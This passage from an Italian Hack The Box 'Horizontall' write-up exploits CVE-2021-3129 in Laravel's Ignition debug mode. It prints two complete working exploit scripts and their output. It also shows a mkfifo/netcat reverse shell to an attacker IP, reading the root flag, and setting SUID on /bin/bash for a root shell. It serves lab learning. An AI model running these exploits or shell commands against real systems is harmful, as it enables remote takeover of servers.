 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sun Sep 24 11:22:04 UTC 2023

  System load:  0.0               Processes:           287
  Usage of /:   83.2% of 4.85GB   Users logged in:     1
  Memory usage: 54%               IP address for eth0: 10.10.11.105
  Swap usage:   0%


0 updates can be applied immediately.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Sun Sep 24 11:05:25 2023 from 10.10.14.14
$

```

Visitiamo 127.0.0.1:8000
![](../zzz_rev/attachments/Horizontall6.png)
Da quello che vediamo siamo di fronte ad una verisone di `Lavavel v8(PHPv.7.4.18)`

[Searchsploit](Note/Tool/Searchsploit.md) non ci restituisce nulla vediamo se abbiamo qualcosa con google.

## CVE-2021-3129_exploit


Ho trovato questa CVE la scarichiamo e gli diamo un occhio 

```bash
┌──(root㉿kali)-[/home/kali/htb/horizontall]
└─# git clone https://github.com/nth347/CVE-2021-3129_exploit.git
```

```bash
┌──(root㉿kali)-[/home/kali/htb/horizontall/CVE-2021-3129_exploit]
└─# cat exploit.py
#$ git clone https://github.com/nth347/CVE-2021-3129_exploit.git
#$ cd CVE-2021-3129_exploit
#$ chmod +x exploit.py
#$ ./exploit.py http://localhost:8000 Monolog/RCE1 id
#!/usr/bin/env python3
import requests
import subprocess
import re
import os
import sys


# Send a post request with a specific viewFile value, returning HTTP response
def send(url='', viewfile=''):
    headers = {
        "Accept": "application/json"
    }
    data = {
        "solution": "Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution",
        "parameters": {
            "variableName": "whateverYouWant",
            "viewFile": ""
        }
    }
    data['parameters']['viewFile'] = viewfile
    resp = requests.post(url, json=data, headers=headers, verify=False)
    return resp


# Generate payload and return it as text
def generate(chain='', command=''):
    # Ensure that we have PHPGGC in current directory, if not we'll clone it
    if os.path.exists("phpggc"):
        print("[+] PHPGGC found. Generating payload and deploy it to the target")
    else:
        print("[i] PHPGGC not found. Cloning it")
        os.system("git clone https://github.com/ambionics/phpggc.git")
    payload = subprocess.getoutput(
        r"php -d'phar.readonly=0' ./phpggc/phpggc '%s' system '%s' --phar phar -o php://output | base64 -w0 | "
        r"sed -E 's/./\0=00/g; s/==/=3D=/g; s/$/=00/g'" % (chain, command))
    return payload


# Clear logs,
def clear(url):
    print("[i] Trying to clear logs")
    while (send(url,
                "php://filter/write=convert.iconv.utf-8.utf-16be|convert.quoted-printable-encode|convert.iconv.utf"
                "-16be.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log").status_code != 200):
        continue
    print("[+] Logs cleared")


if __name__ == '__main__':
    if len(sys.argv) < 4:
        print("Usage:   %s <URL> <CHAIN> <CMD>" % sys.argv[0])
        print("Example: %s http(s)://localhost:8000 Monolog/RCE1 whoami" % sys.argv[0])
        print("I recommend to use Monolog/RCE1 or Monolog/RCE2 as CHAIN")
        exit(1)
    url = sys.argv[1] + "/_ignition/execute-solution"
    chain = sys.argv[2]
    command = sys.argv[3]

    # Step 1. Clear logs, write the first log entry
    clear(url)
    send(url, "AA")

    # Step 3. Write the second log entry with encoded PHAR payload
    send(url, generate(chain, command))

    # Step 4. Convert log file to a valid PHAR
    if (send(url,
             "php://filter/read=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64"
             "-decode/resource=../storage/logs/laravel.log").status_code == 200):
        print("[+] Successfully converted logs to PHAR")
    else:
        print("[-] Fail to convert logs to PHAR")

    # Step 5. Trigger PHAR deserialization, extract the output
    response = send(url, "phar://../storage/logs/laravel.log")
    result = re.sub("{[\s\S]*}", "", response.text)
    if result:
        print("[+] PHAR deserialized. Exploited\n")
        print(result)
    else:
        print("[i] There is no output")

    # Clear logs
    clear(url)
```


Seguiamo le istruzioni dell'exploit

```bash
┌──(root㉿kali)-[/home/kali/htb/horizontall/CVE-2021-3129_exploit]
└─# python3 exploit.py http://localhost:8000 Monolog/RCE1 id
[i] Trying to clear logs
[+] Logs cleared
[+] PHPGGC found. Generating payload and deploy it to the target
[+] Successfully converted logs to PHAR
[+] PHAR deserialized. Exploited

uid=0(root) gid=0(root) groups=0(root)

[i] Trying to clear logs
[+] Logs cleared

```

Abbiamo l'RCE, modifichiamo il comando aggiungendo un revshell, ma prima ci mettiamo in ascolto con nc 

```bash
┌──(root㉿kali)-[/home/kali]
└─# nc -lvp 4444
listening on [any] 4444 ...

```

eseguiamo l'exploit

```bash
┌──(root㉿kali)-[/home/kali/htb/horizontall/CVE-2021-3129_exploit]
└─# python3 exploit.py http://localhost:8000 Monolog/RCE1 "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.14 4444 >/tmp/f"
[i] Trying to clear logs
[+] Logs cleared
[+] PHPGGC found. Generating payload and deploy it to the target
[+] Successfully converted logs to PHAR
```

ed abbiamo la nostra shell

```bash

┌──(root㉿kali)-[/home/kali]
└─# nc -lvp 4444
listening on [any] 4444 ...
connect to [10.10.14.14] from horizontall.htb [10.10.11.105] 45232
/bin/sh: 0: can't access tty; job control turned off
#uid=0(root) gid=0(root) groups=0(root)
```

>[!info]
>Non so per quale motivo il tunnel ssh cade e di conseguenza ed la shell si interrompe 


## 49424.py

Dato che la versione di laravel è <= v8.4.2 proviamo ad utilizzare il seguente script per ottenere una RCE [https://www.exploit-db.com/exploits/49424](https://www.exploit-db.com/exploits/49424)

Scarichiamo e diamo un occhio 

```bash
┌──(root㉿kali)-[/home/kali/htb/horizontall]
└─# searchsploit -m 49424
  Exploit: Laravel 8.4.2 debug mode - Remote code execution
      URL: https://www.exploit-db.com/exploits/49424
     Path: /usr/share/exploitdb/exploits/php/webapps/49424.py
    Codes: CVE-2021-3129
 Verified: False
File Type: Python script, ASCII text executable
Copied to: /home/kali/htb/horizontall/49424.py

┌──(root㉿kali)-[/home/kali/htb/horizontall]
└─# cat 49424.py
# Exploit Title: Laravel 8.4.2 debug mode - Remote code execution
# Date: 1.14.2021
# Exploit Author: SunCSR Team
# Vendor Homepage: https://laravel.com/
# References:
# https://www.ambionics.io/blog/laravel-debug-rce
# https://viblo.asia/p/6J3ZgN8PKmB
# Version: <= 8.4.2
# Tested on: Ubuntu 18.04 + nginx + php 7.4.3
# Github POC: https://github.com/khanhnv-2091/laravel-8.4.2-rce


#!/usr/bin/env python3

import requests, sys, re, os

header={
    "Accept": "application/json"
}

data = {
        "solution":"Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution",\
        "parameters":{
            "variableName":"cm0s",
            "viewFile":""
        }
    }

def clear_log(url='', viewFile=''):

    global data

    data['parameters']['viewFile'] = viewFile
    while (requests.post(url=url, json=data, headers=header, verify=False).status_code != 200): pass
    requests.post(url=url, json=data, headers=header, verify=False)
    requests.post(url=url, json=data, headers=header, verify=False)

def create_payload(url='', viewFile=''):

    global data

    data['parameters']['viewFile'] = viewFile
    resp = requests.post(url=url, json=data, headers=header, verify=False)
    if resp.status_code == 500 and f'file_get_contents({viewFile})' in resp.text:
        return True
    return False

def convert(url='', viewFile=''):

    global data

    data['parameters']['viewFile'] = viewFile
    resp = requests.post(url=url, json=data, headers=header, verify=False)
    if resp.status_code == 200:
        return True
    return False

def exploited(url='', viewFile=''):

    global data

    data['parameters']['viewFile'] = viewFile
    resp = requests.post(url=url, json=data, headers=header, verify=False)
    if resp.status_code == 500 and 'cannot be empty' in resp.text:
        m = re.findall(r'\{(.|\n)+\}((.|\n)*)', resp.text)
        print()
        print(m[0][1])

def generate_payload(command='', padding=0):
    if '/' in command:
        command = command.replace('/', '\/')
        command = command.replace('\'', '\\\'')
    os.system(r'''php -d'phar.readonly=0' ./phpggc/phpggc monolog/rce1 system '%s' --phar phar -o php://output | base64 -w0 | sed -E 's/./\0=00/g' > payload.txt'''%(command))
    payload = ''
    with open('payload.txt', 'r') as fp:
        payload = fp.read()
        payload = payload.replace('==', '=3D=')
        for i in range(padding):
            payload += '=00'
    os.system('rm -rf payload.txt')
    return payload


def main():

    if len(sys.argv) < 4:
        print('Usage:  %s url path-log command\n'%(sys.argv[0]))
        print('\tEx: %s http(s)://pwnme.me:8000 /var/www/html/laravel/storage/logs/laravel.log \'id\''%(sys.argv[0]))
        exit(1)

    if not os.path.isfile('./phpggc/phpggc'):
        print('Phpggc not found!')
        print('Run command: git clone https://github.com/ambionics/phpggc.git')
        os.system('git clone https://github.com/ambionics/phpggc.git')

    url = sys.argv[1]
    path_log = sys.argv[2]
    command = sys.argv[3]
    padding = 0

    payload = generate_payload(command, padding)
    if not payload:
        print('Generate payload error!')
        exit(1)

    if 'http' not in url and 'https' not in url:
        url = 'http'+url
    else:
        url = url+'/_ignition/execute-solution'

    print('\nExploit...')
    clear_log(url, 'php://filter/write=convert.base64-decode|convert.base64-decode|convert.base64-decode/resource=%s'%(path_log))
    create_payload(url, 'AA')
    create_payload(url, payload)
    while (not convert(url, 'php://filter/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=%s'%(path_log))):
        clear_log(url, 'php://filter/write=convert.base64-decode|convert.base64-decode|convert.base64-decode/resource=%s'%(path_log))
        create_payload(url, 'AA')
        padding += 1
        payload = generate_payload(command, padding)
        create_payload(url, payload)

    exploited(url, 'phar://%s'%(path_log))

if __name__ == '__main__':
    main()
```

l'exploit di default non funziona.
Bisogna modificare l'exploit, l'unico cambiamento è quello di modificare la path contenente il file `laravel.log`.

Al posto di utilizzare la path di default   /var/www/html/laravel/storage/logs/laravel.log

L'idea era di utilizzare la seguente path  /home/developer/myproject/storage/logs/laravel.log
in quanto a seguito l'enumerazione la cartella di myproject mi da permesso negato e ho ipotizzato che il file.log fosse li.

Il comando finale per ottenere una rev shell è il seguente

```bash
┌──(root㉿kali)-[/home/kali/htb/horizontall]
└─# python3 49424.py http://localhost:8000 /home/developer/myproject/storage/logs/laravel.log "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|/bin/nc 10.10.14.14 4444 >/tmp/f"
```


>[!info]
>Anche qui ho lo stesso problema di stabilità del tunneling ssh e di conseguenza dell shell
>


Prendiamo la flag root.txt

```bash
┌──(root㉿kali)-[/home/kali/htb/horizontall]
└─# python3 49424.py http://localhost:8000 /home/developer/myproject/storage/logs/laravel.log "cat /root/root.txt"

Exploit...

15d289c1ac7b88e97b34c67aff882aa5
```


## Stabel Shell

```bash
┌──(root㉿kali)-[/home/kali/htb/horizontall]
└─# python3 exploit.py http://localhost:1337 Monolog/RCE1 "chmod u+s /bin/bash"
```

Con "chmod u+s /bin/bash", stiamo effettivamente abilitando l'esecuzione del terminale `/bin/bash` con i privilegi dell'utente proprietario del file `/bin/bash` che è l'utente root. Quindi, qualsiasi utente che esegue `/bin/bash` dopo che è stato impostato con il bit set-UID otterrà un shell con privilegi di root.

```bash
Last login: Mon Sep 25 11:16:26 2023 from 10.10.14.14
$ ls -l /bin/bash
-rwsr-xr-x 1 root root 1113504 Jun  6  2019 /bin/bash
$
```

non chi resta che richiamare la shell con i privilegi di root

```bash
$ /bin/bash -p
bash-4.4# id
uid=1001(strapi) gid=1001(strapi) euid=0(root) groups=1001(strapi)
bash-4.4# whoami
root
```
